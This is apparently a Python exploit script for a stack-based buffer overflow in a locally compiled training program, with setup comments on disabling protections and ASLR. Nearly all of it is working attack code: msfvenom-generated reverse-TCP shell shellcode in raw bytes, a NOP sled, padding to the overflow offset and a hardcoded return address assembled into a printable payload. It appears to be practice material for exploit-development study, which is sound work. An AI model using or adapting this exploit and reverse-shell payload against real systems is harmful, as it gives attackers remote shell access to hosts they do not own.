#!/usr/bin/python

# "training.c" compiled with --> gcc -no-pie -fno-stack-protector -z execstack training.c -o training
# ASLR disabled with --> sudo su; echo 0 > /proc/sys/kernel/randomize_va_space

# arch: 64 bit
# protections: none
# vuln type / strategy: basic stack-based buffer overflow - dropping shellocode onto the stack and
# jumping to it
# shellcode created with: msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -a x64 -b "\x00" -f python

# offset: 616

from struct import pack

padding = "\x90"*16

buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x2c\x2d\xc7\x44\x55\x3c\xee"
buf += b"\x8a\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x46\x04\x9f\xdd\x3f\x3e\xb1\xe0\x2d\x73\xc8\x41\x1d"
buf += b"\xab\xa6\x33\x2e\x2d\xc6\xff\x2a\x3c\xee\x8b\x7d\x65"
buf += b"\x4e\xa2\x3f\x2c\xb4\xe0\x06\x75\xc8\x41\x3f\x3f\xb0"
buf += b"\xc2\xd3\xe3\xad\x65\x0d\x33\xeb\xff\xda\x47\xfc\x1c"
buf += b"\xcc\x74\x55\xa5\x4e\x44\xa9\x6b\x26\x54\xee\xd9\x64"
buf += b"\xa4\x20\x16\x02\x74\x67\x6c\x23\x28\xc7\x44\x55\x3c"
buf += b"\xee\x8a"

junk = "A"*(600 - len(buf))

eip = pack("<Q", 0x7fffffffdd00)

payload = (padding + buf + junk + eip)

print payload
